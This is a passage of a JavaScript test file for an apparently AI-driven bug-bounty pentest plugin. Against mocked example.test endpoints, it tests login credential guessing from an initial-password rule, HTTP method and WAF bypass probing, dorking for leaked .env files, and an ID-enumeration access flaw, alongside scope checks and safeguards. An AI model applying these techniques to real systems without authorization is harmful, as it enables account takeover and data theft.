      const method = (init?.method ?? "GET").toUpperCase();
      if (method === "POST") return new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
      return new Response("forbidden", { status: 403, headers: { "content-type": "application/json" } });
    };
    const bypass = await h.run("src_test_bypass", { intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test", baseline: { method: "GET", path: "/api/users" }, variants: [{ method: "POST", path: "/api/users", allowBody: true, rawBody: "", note: "method variant" }] }, parent);
    assert.equal(bypass.differential, true);
    assert.equal(bypass.requiresDecision, false);

    // 5) mark intent completed, run finalize, and produce report
    await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
    const finalize = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "e2e 演练停止" }, parent);
    assert.equal(finalize.ready, true);
    const report = await h.run("src_report", {}, parent);
    assert.match(report.markdown, /受限完成声明/);
    assert.match(report.markdown, /e2e 演练停止/);
    assert.match(report.markdown, /## API 发现摘要/);
    assert.match(report.markdown, /## 漏洞研究矩阵/);

    // 6) state summary reflects the whole engagement
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.apiDiscovery.total >= 1, true);
    assert.equal(state.counts.intents, 1);
  } finally { globalThis.fetch = originalFetch; }
});




test("finalize allowIncomplete without reason throws; reason lands in report declaration", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "g", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true }, parent), /allowIncompleteReason/);
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "   " }, parent), /allowIncompleteReason/);
  const ok = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "WAF 全程拦截，用户指示停止" }, parent);
  assert.equal(ok.ready, true);
  assert.match(ok.warnings.join(" "), /受限完成/);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /受限完成声明[\s\S]*WAF 全程拦截，用户指示停止/);
});

test("legacy src_record_recon/src_record_asset_observation events still replay in projection after tool removal", () => {
  const h = harness();
  assert.equal(h.tools.has("src_record_recon"), false);
  assert.equal(h.tools.has("src_record_asset_observation"), false);
  const projection = h.projections.get("src");
  const call = (state, name, args) => projection.apply(state, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let state = projection.init();
  state = call(state, "src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" });
  state = call(state, "src_add_intent", { title: "recon", detail: "", goalId: "goal-1" });
  state = call(state, "src_record_recon", { intentId: "intent-1", source: "crt.sh", method: "passive", assets: [{ type: "subdomain", value: "api.example.test" }], facts: [{ kind: "info", detail: "wildcard cert" }] });
  state = call(state, "src_record_asset_observation", { intentId: "intent-1", type: "subdomain", value: "vpn.example.test", source: "DNS", method: "passive", confidence: 0.9, status: "candidate" });
  const view = projection.view(state);
  assert.equal(view.assets.some((a) => a.value === "api.example.test"), true);
  assert.equal(view.assets.some((a) => a.value === "vpn.example.test"), true);
});


test("finalize downgrades info/low-only findings to warning (SRC accepts real-harm low findings)", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "找到真实危害漏洞", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "audit", detail: "x", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  const factEvidence1 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET / => VAppServer/6.0.0 banner", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "版本指纹泄露", severity: "low", impact: "暴露版本号，可匹配已知 CVE 定向利用", affectedScope: "全站", remediation: "隐藏版本", pocEvidence: ["GET / => VAppServer/6.0.0"], reproducibleSteps: ["GET /"], victimImpact: "运维与用户均无感知地暴露后端框架与版本信息，攻击者可据此检索匹配的已知漏洞发起定向利用", attackPrerequisites: "仅需网络可达目标首页，无需登录或任何用户交互", concreteLossEvidence: [factEvidence1] }, parent);
  await h.run("src_record_research", { intentId: "intent-1", category: "info-leak", hypothesis: "版本泄露", status: "verified", findingId: "finding-1" }, parent);
  // rawRequest 门禁仍会阻断；但「仅 info/low」不再是 blocker，降级为 warning
  const result = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(result.ready, false);
  assert.equal(result.blockers.some((b) => /真实危害|info\/low/.test(b)), false);
  assert.match(result.warnings.join(" "), /仅存在 low 级 finding/);
});

test("src_test_credential performs bounded credential verification and records hit", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证验证", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "弱口令", goalId: "goal-1" }, parent);
  await h.run("src_record_research", { intentId: "intent-1", category: "credential-test", hypothesis: "初始密码规则可命中", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url, init) => {
      const body = new URLSearchParams(init.body);
      const ok = body.get("password") === "Lzit@19991234";
      return new Response(ok ? "欢迎登录" : "密码错误", { status: ok ? 200 : 200, headers: { "content-type": "text/html; charset=utf-8" } });
    };
    const result = await h.run("src_test_credential", {
      intentId: "intent-1", loginUrl: "https://example.test/login", username: "student001",
      candidates: ["123456", "Lzit@19991234", "admin1"], dictionarySource: "初始密码规则 Lzit@身份证后8位", rps: 0.5
    }, parent);
    assert.equal(result.hit, true);
    assert.equal(result.triedCount, 2);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.facts.some((f) => /凭据命中/.test(f.detail)), true);
    assert.equal(state.coverage.some((c) => c.phase === "credential-test" && c.status === "completed"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_credential stops on captcha unless bypass noted", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证验证", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "弱口令", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('<div>请输入图形验证码 captcha</div>', { status: 200, headers: { "content-type": "text/html" } });
    const result = await h.run("src_test_credential", {
      intentId: "intent-1", loginUrl: "https://example.test/login", username: "student001", candidates: ["123456"], dictionarySource: "默认密码"
    }, parent);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.stopReason, "captcha-detected-unverifiable");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_record_observation and src_user_todo lifecycle", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "时间线", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "探测", goalId: "goal-1" }, parent);
  const obs = await h.run("src_record_observation", { intentId: "intent-1", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "UA变换绕过成功" }, parent);
  assert.equal(obs.protectionSignal, true);
  const todo = await h.run("src_user_todo", { title: "提供已登录 Burp 请求", kind: "auth-session", detail: "在 Burp 代理下登录后导出任意一条请求" }, parent);
  assert.equal(todo.status, "pending");
  const done = await h.run("src_user_todo", { userTodoId: todo.id, title: "提供已登录 Burp 请求", status: "done", note: "已导出发你" }, parent);
  assert.equal(done.status, "done");
  assert.equal(done.note, "已导出发你");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.observations, 1);
  assert.equal(state.counts.userTodos, 1); /* [local.65] 仅本测建的待办（机械覆盖待办已拆除） */
  assert.equal(state.userTodos.filter((t) => t.title === "提供已登录 Burp 请求")[0].status, "done");
});

test("src_collect_dorks generates five-category queries and records facts", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "dorks", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "dorks侦察", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('<a class="result__a" href="https://github.com/x/y/blob/main/.env">github.com/x/y .env leak</a>', { status: 200, headers: { "content-type": "text/html" } });
    const result = await h.run("src_collect_dorks", { intentId: "intent-1", domain: "example.test" }, parent);
    assert.equal(result.queries >= 15, true);
    assert.equal(result.fetched, 6);
    assert.equal(result.facts, result.queries);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.facts.some((f) => /dorks\[credential\] 查询/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /dorks\[credential\] 命中.*github\.com/.test(f.detail)), true);
    assert.equal(state.coverage.some((c) => c.category === "dorks" && c.status === "completed"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_dorks rejects out-of-scope domains", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "dorks", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "dorks侦察", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_collect_dorks", { intentId: "intent-1", domain: "evil-elsewhere.com" }, parent), /outside the authorized goal host/);
});

test("src_import_traffic parses HAR, records full auth profiles and skips out-of-scope", async () => {
  const h = harness();
  const parentEvents = [];
  h.sessions.set("p", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "导入", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "流量导入", goalId: "goal-1" }, parent);
  const har = { log: { entries: [
    { request: { method: "GET", url: "https://app.example.test/resume?page=2", headers: [{ name: "Cookie", value: "SESSION=abcdef123456; Path=/" }] }, response: { status: 200, headers: [{ name: "Content-Type", value: "text/html" }], content: { text: "<html>简历页</html>" } } },
    { request: { method: "POST", url: "https://evil-elsewhere.com/x", headers: [] }, response: { status: 200, headers: [], content: { text: "" } } }
  ] } };
  const result = await h.run("src_import_traffic", { intentId: "intent-1", mode: "har", data: JSON.stringify(har), authProfileNote: "学生账号 student001 已授权" }, parent);
  assert.equal(result.observations, 1);
  assert.equal(parentEvents.some((e) => e.type === "tool/call" && e.data.name === "src_record_observation"), true);
  assert.equal(result.outOfScope, 1);
  assert.equal(result.authFacts, 1);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.observations.some((o) => o.path === "/resume?page=2" && o.httpStatus === 200), true);
  assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "app.example.test/resume"), true);
  const authFact = state.facts.find((f) => f.kind === "auth-profile" && /cookie/i.test(f.detail));
  assert.ok(authFact, "auth fact recorded");
  /* [local.54] 认证头入凭证库：fact 只存 header 名 + credentialRef，不落明文。 */
  assert.match(authFact.detail, /credential:\/\//);
  assert.doesNotMatch(authFact.detail, /SESSION=abcdef123456/);
  assert.ok(result.credentialRefs.length >= 1, "credentialRefs returned");
  assert.match(result.credentialRefs[0].credentialRef, /^credential:\/\//);
  /* 登记的 testAccount 行也可引用 */
  assert.equal(state.testAccounts.some((r) => r.label.startsWith("imported-cookie-")), true);
});

test("src_import_traffic mcp mode consumes pre-fetched flows", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "导入", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "流量导入", goalId: "goal-1" }, parent);
  const result = await h.run("src_import_traffic", { intentId: "intent-1", mode: "mcp", flows: [{ method: "GET", url: "https://example.test/api/user", status: 200, reqHeaders: "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9xyz", respHeaders: "Content-Type: application/json", body: "{\"id\":1}" }] }, parent);
  assert.equal(result.observations, 1);
  assert.equal(result.authFacts, 1);
  const state = await h.run("src_state", {}, parent);
  const mcpObs = state.observations.find((o) => o.source === "burp-mcp");
  assert.ok(mcpObs, "burp-mcp observation recorded");
  const authFact = state.facts.find((f) => f.kind === "auth-profile" && /authorization/i.test(f.detail));
  assert.ok(authFact, "auth fact recorded");
  /* [local.54] 认证头入凭证库：不落明文，只存引用。 */
  assert.match(authFact.detail, /credential:\/\//);
  assert.doesNotMatch(authFact.detail, /Bearer eyJhbGciOiJIUzI1NiJ9xyz/);
});

test("报告输出 7 字段含 entryPoint/discoveryPath/raw 请求/响应 + finalize rawRequest 门禁", async () => {
  /* [local.65] 机械覆盖待办已拆除：收官闸只受 agent 主动挂的待办影响。 */
  const h = harness();
  // 门禁部分：缺 rawRequest 被 finalize 拦截
  const p1 = h.exec("gate");
  await h.run("src_add_goal", { target: "https://app.example.test", objective: "门禁", authorization: "SRC" }, p1);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, p1);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, p1);
  const factEvidence2 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET /resume?id=2 -> 200 他人姓名电话", confidence: 0.9 }, p1)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "越权读取简历", severity: "high", impact: "泄露", affectedScope: "全站", remediation: "鉴权", pocEvidence: ["GET /resume?id=2 -> 200"], reproducibleSteps: ["GET /resume?id=2"], victimImpact: "任意求职者的姓名电话邮箱可被陌生人批量读取，存在诈骗骚扰风险且无从察觉", attackPrerequisites: "攻击者仅需注册普通账号并遍历简历 ID，无管理权限", concreteLossEvidence: [factEvidence2] }, p1);
  await h.run("src_record_research", { intentId: "intent-1", category: "authorization-bypass", hypothesis: "id 越权", status: "verified", findingId: "finding-1" }, p1);
  const blocked = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, p1);
  assert.equal(blocked.ready, false);
  assert.equal(blocked.blockers.some((b) => /rawRequest/.test(b)), true);
  // 通过部分：独立 session，带全字段
  const p2 = h.exec("full");
  await h.run("src_add_goal", { target: "https://app.example.test", objective: "通过", authorization: "SRC" }, p2);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, p2);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, p2);
  const factEvidence3 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET /resume?id=2 -> 200 {\"id\":2,\"name\":\"他人\"}", confidence: 0.9 }, p2)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "越权读取他人简历", severity: "high", impact: "任意学生简历泄露", affectedScope: "全站学生", remediation: "后端鉴权", pocEvidence: ["GET /resume?id=2 -> 200"], reproducibleSteps: ["GET /resume?id=2"], entryPoint: "简历查看页-详情", discoveryPath: "Burp proxy history 导入 app.example.test/api/resume", rawRequest: "GET /resume?id=2 HTTP/1.1\r\nHost: app.example.test\r\nCookie: SESSION=x\r\n\r\n", rawResponse: "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":2,\"name\":\"他人\"}", victimImpact: "任意学生的简历隐私数据被陌生人读取，存在被诈骗与骚扰风险且无从察觉", attackPrerequisites: "攻击者仅需普通账号并遍历简历 ID，无管理权限", concreteLossEvidence: [factEvidence3] }, p2);
  await h.run("src_record_research", { intentId: "intent-1", category: "authorization-bypass", hypothesis: "id 越权", status: "verified", findingId: "finding-1" }, p2);
  const ok = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, p2);
  assert.equal(ok.ready, true);
  const report = await h.run("src_report", {}, p2);
  assert.match(report.markdown, /前端功能点：简历查看页-详情/);
  assert.match(report.markdown, /① 发现：Burp proxy history/);
  assert.match(report.markdown, /=== Request ===/);
  assert.match(report.markdown, /GET \/resume\?id=2 HTTP\/1\.1/);
  assert.match(report.markdown, /=== Response ===/);
});

test("src_collect_passive 识别 AI 站点并落 ai-surface 资产 + 研究骨架", async () => {
  const h = harness();
  const parent = h.exec("ai");
  await h.run("src_add_goal", { target: "https://ai.example.test", objective: "AI 面收集", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "被动侦察", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    let call = 0;
    globalThis.fetch = async (url) => {
      const p = new URL(url).pathname;
      call++;
      if (p === "/" && call <= 2) return new Response("<html><title>AI 助手 powered by deepseek</title>大模型对话</html>", { status: 200, headers: { "content-type": "text/html" } });
      return new Response("", { status: 404, headers: { "content-type": "text/plain" } });
    };
    const result = await h.run("src_collect_passive", { intentId: "intent-1", baseUrl: "https://ai.example.test", hostnames: ["ai.example.test"], maxHints: 5 }, parent);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.assets.some((a) => a.type === "ai-surface" && a.value === "https://ai.example.test"), true);
    assert.equal(state.research.some((r) => r.category === "ai-abuse" && r.status === "hypothesis"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("checkpoint 记录 decision 决策理由（时间线决策字段）", async () => {
  const h = harness();
  h.sessions.set("pdec", { append() {} });
  const parent = h.exec("pdec");
  const child = h.exec("cdec", "pdec");
  await h.run("src_add_goal", { target: "https://example.test", objective: "决策", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, parent);
  const result = await h.run("src_submit", { intentId: "intent-1", stage: "blocked", summary: "WAF 拦截需绕过", facts: [{ kind: "http", target: "https://example.test", detail: "/admin 403", confidence: 0.7 }], assets: [], findings: [], decision: "撞 WAF 403，拟先做 UA 变体绕过试探再决定" }, child);
  assert.equal(result.duplicateCheckpoint, false);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.checkpoints[0].decision, "撞 WAF 403，拟先做 UA 变体绕过试探再决定");
});

test("projection 回放 observation/user_todo 并在 view 输出（UI 数据面）", async () => {
  const h = harness();
  const parent = h.exec("pproj");
  await h.run("src_add_goal", { target: "https://example.test", objective: "投影", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, parent);
  await h.run("src_record_observation", { intentId: "intent-1", method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, wafBypassed: false, source: "scan", decision: "WAF 拦截" }, parent);
  const todo = await h.run("src_user_todo", { title: "提供已登录 Burp 请求", detail: "登录态获取", kind: "auth-session" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.observations.length, 1);
  assert.equal(state.userTodos.filter((t) => t.title === "提供已登录 Burp 请求").length, 1); /* 按标题过滤断言 */
  // 折叠面单测：fold 工具事件后 view 应输出 observations/userTodos（UI 数据面）
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  st = { ...st, goal: { id: "goal-1", target: "https://example.test", objective: "投影", authorization: "SRC" } };
  const call = (name, args) => mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  st = call("src_add_intent", { title: "侦察", goalId: "goal-1" });
  st = call("src_record_observation", { intentId: "intent-1", method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "WAF 拦截" });
  st = call("src_user_todo", { title: "提供已登录 Burp 请求", detail: "登录态获取", kind: "auth-session" });
  const proj = mod.viewSrcState(st);
  assert.equal(proj.observations.length, 1);
  assert.equal(proj.userTodos.length, 1);
  assert.equal(proj.counts.observations, 1);
});

/* [local.56] 历史加载炸图根因：sessionProjections 的 schema 把「存量事件里根本不存在的键」
 * 写成 z.union([z.string(), z.undefined()])——本机 zod 对【缺失键】报 expected:"nonoptional"，
 * 严格校验直接拒接 fold 结果 → 整个会话历史打不开。改为 z.string().optional() 后三种形态
 * （缺失/显式 undefined/字符串）全过。本测试用真实 fold 产出「无凭据挂起审批」（credentialRef
 * 键被条件省略，与旧存量事件一致）验证 schema 不再拒绝。 */
test("[local.56] 存量缺键事件不再炸历史加载：无凭据挂起审批过 srcProjectionSchema", async () => {
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  const call = (name, args) => { st = mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } }); };
  call("src_add_goal", { target: "https://legacy.test", objective: "存量回放", authorization: "SRC" });
  /* 挂起审批不带凭据：fold 条件省略 credentialRef（键缺失）；intentId 为显式 undefined */
  call("src_record_pending_approval", { id: "approval-1", method: "GET", url: "https://legacy.test/admin", path: "/admin", headers: "", body: "", category: "unauth", reason: "高危端点", justification: "授权范围内" });
  call("src_user_todo", { title: "旧待办", detail: "登录态获取", kind: "auth-session" });
  call("src_record_observation", { intentId: "intent-1", method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "WAF 拦截" });
  /* 与 host sessionProjections 同一 schema：校验的是 view 输出（counts/apiDiscovery 是派生字段） */
  const view = mod.viewSrcState(st);
  const parsed = mod.srcProjectionSchema.safeParse(view);
  assert.ok(parsed.success, `投影 schema 应接受缺失键状态：${parsed.success ? "" : JSON.stringify(parsed.error.issues[0])}`);
  assert.equal(st.pendingApprovals.length, 1);
  assert.equal("credentialRef" in st.pendingApprovals[0], false, "无凭据时 credentialRef 键应缺失而非空串");
  /* 最坏情况：手工构造所有可选键全缺失的状态也必须能过（覆盖 coverage/research 分支） */
  const worst = { ...st, coverage: [{ id: "cov-1", phase: "recon", category: "recon", status: "completed", evidence: [], limitation: "", updatedAt: Date.now() }], research: [{ id: "res-1", intentId: "intent-1", category: "auth", hypothesis: "h", preconditions: [], status: "hypothesis", stopReason: "", evidence: [], updatedAt: Date.now() }] };
  const worstParsed = mod.srcProjectionSchema.safeParse(mod.viewSrcState(worst));
  assert.ok(worstParsed.success, `全可选键缺失状态应能过 schema：${worstParsed.success ? "" : JSON.stringify(worstParsed.error.issues[0])}`);
  /* 同根问题第二类：src_test_bypass fold 曾硬编码 status:"testing"（不在 schema 枚举），
   * 凡跑过未被拦的 bypass 的存量会话历史加载必炸——改为 "running" 后全库 275/275 可回放 */
  let bt = JSON.parse(JSON.stringify(mod.srcInitialState));
  bt = mod.applySrcEvent(bt, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "https://x.test", objective: "o", authorization: "SRC" }) } });
  bt = mod.applySrcEvent(bt, { type: "tool/call", data: { name: "src_add_intent", arguments: JSON.stringify({ title: "t", goalId: "goal-1" }) } });
  bt = mod.applySrcEvent(bt, { type: "tool/call", data: { name: "src_test_bypass", arguments: JSON.stringify({ intentId: "intent-1", category: "path-normalization", baseUrl: "https://x.test", baseline: { method: "GET", path: "/" } }) } });
  const cov = bt.coverage.find((c) => c.category === "bypass-verification");
  assert.equal(cov?.status, "running", "bypass fold 应写 running 而非枚举外的 testing");
  const btParsed = mod.srcProjectionSchema.safeParse(mod.viewSrcState(bt));
  assert.ok(btParsed.success, `bypass coverage 状态应过 schema：${btParsed.success ? "" : JSON.stringify(btParsed.error.issues[0])}`);
});

/* [local.33] fold：src_auth_budget 权威计数落 state；非法参数忽略；src_add_goal 保留会话级预算。 */
test("[local.33] fold src_auth_budget：计数落 state，非法参数忽略，跨 goal 保留", async () => {
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  const call = (name, args) => { st = mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } }); };
  call("src_add_goal", { target: "example.test", objective: "预算" });
  call("src_auth_budget", { used: 7, limit: 30 });
  let view = mod.viewSrcState(st);
  assert.equal(view.authBudget.used, 7);
  assert.equal(view.authBudget.limit, 30);
  call("src_auth_budget", { used: -5, limit: 30 });
  call("src_auth_budget", { used: "x", limit: 0 });
  assert.equal(mod.viewSrcState(st).authBudget.used, 7, "非法 used/limit 不污染");
  call("src_auth_budget", { used: 9, limit: 30 });
  call("src_add_goal", { target: "other.test", objective: "重开" });
  view = mod.viewSrcState(st);
  assert.equal(view.authBudget.used, 9, "src_add_goal 保留会话级认证预算");
  assert.equal(view.domainNotes.length, 0, "域笔记随 goal 重置，等快照事件重建");
});

/* [local.33] fold：src_domain_notes_snapshot 整表替换 + 脏行过滤。 */
test("[local.33] fold src_domain_notes_snapshot：快照替换 domainNotes，脏行过滤", async () => {
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  const call = (name, args) => { st = mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } }); };
  call("src_add_goal", { target: "example.test", objective: "笔记" });
  call("src_domain_notes_snapshot", { notes: [
    { id: "domainNote-1", category: "pitfall", title: "api/v1 限流", content: "burst 会 429", sourceSessionId: "s1", createdAt: 1, updatedAt: 2 },
    { id: "", title: "脏行缺 id" },
    null,
    { id: "domainNote-2", title: "缺类别默认 misc" },
    { id: "domainNote-3" }
  ] });
  const view = mod.viewSrcState(st);
  assert.equal(view.domainNotes.length, 2);
  assert.equal(view.domainNotes[0].content, "burst 会 429");
  assert.equal(view.domainNotes[1].category, "misc");
  assert.equal(view.counts.domainNotes, 2);
});

test("/src-todo feedback parser validates id/status and keeps note", () => {
	const good = parseTodoFeedback(" userTodo-2   done 已用 Burp 抓包 ");
	assert.equal(good.ok, true);
	assert.equal(good.userTodoId, "userTodo-2");
	assert.equal(good.status, "done");
	assert.equal(good.note, "已用 Burp 抓包");
	const reopened = parseTodoFeedback("userTodo-3 pending");
	assert.equal(reopened.ok, true);
	assert.equal(reopened.note, "");
	/* [local.64 后 id 统一为 userTodo-N；旧前缀 todo-N 仍兼容；hackone 实错 userTodo-6 abandoned 被旧正则拒收 */
	const legacy = parseTodoFeedback("todo-2 done 已用 Burp 抓包");
	assert.equal(legacy.ok, true);
	assert.equal(legacy.userTodoId, "todo-2");
	const abandoned = parseTodoFeedback("userTodo-6 abandoned 没钱买，跳过");
	assert.equal(abandoned.ok, true);
	assert.equal(abandoned.status, "abandoned");
	for (const [input, reason] of [
		["", "缺少参数"],
		["todo-x done", "不合法"],
		["userTodo done", "不合法"],
		["userTodo-1 finished", "必须是"]
	]) {
		const bad = parseTodoFeedback(input);
		assert.equal(bad.ok, false);
		assert.match(bad.error, new RegExp(reason));
	}
});

test("[local.26] /src-reject panel command: validates findingId/reason and relays to agent via followup (mirror of /src-todo)", async () => {
  const h = harness();
  assert.equal(h.commands.has("src-reject"), true, "src-reject registered");

  const parent = h.exec("prej");
  let followed = null;
  parent.agent.followup = (message) => { followed = message; };

  // happy path: findingId + reason -> success + followup instructing src_reject_finding
  const ok = await h.commands.get("src-reject").handler({ rawInput: "finding-2 危害链不闭合，请补 attackChain", agent: parent.agent });
  assert.equal(ok.kind, "success");
  assert.ok(followed, "must followup to the agent");
  const text = followed.content[0].text;
  assert.match(text, /src_reject_finding/);
  assert.match(text, /finding-2/);
  assert.match(text, /危害链不闭合，请补 attackChain/);

  // missing reason -> error, no followup
  followed = null;
  const noReason = await h.commands.get("src-reject").handler({ rawInput: "finding-3", agent: parent.agent });
  assert.equal(noReason.kind, "error");
  assert.match(noReason.text, /缺少打回理由/);
  assert.equal(followed, null, "missing reason must not wake the agent");

  // illegal finding id -> error
  const badId = await h.commands.get("src-reject").handler({ rawInput: "find-3 理由", agent: parent.agent });
  assert.equal(badId.kind, "error");
  assert.match(badId.text, /不合法/);

  // overlong reason (>500) -> error
  const longReason = await h.commands.get("src-reject").handler({ rawInput: `finding-3 ${"x".repeat(501)}`, agent: parent.agent });
  assert.equal(longReason.kind, "error");
  assert.match(longReason.text, /过长|上限 500/);
});

test("[local.9] parseGoalHost: dirty target normalized at src_add_goal and all URL tools", async () => {
  const h = harness();
  const parent = h.exec("p");
  const goal = await h.run("src_add_goal", { target: "mi.com（小米在线服务主域，含 *.mi.com 子域）", objective: "脏目标归一化" }, parent);
  assert.equal(goal.target, "mi.com");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.goal.target, "mi.com");
});

test("[local.9] parseGoalHost rejects unparseable targets with actionable error; src_set_goal_target fixes in place", async () => {
  const h = harness();
  const parent = h.exec("p9b");
  await assert.rejects(() => h.run("src_add_goal", { target: "！！！不是���名", objective: "x" }, parent), /不是可测的公网目标/);
  /* [local.22] 纯 ASCII 品牌名（OPPO）不再被 URL 解析误判为单标签 hostname "oppo"。 */
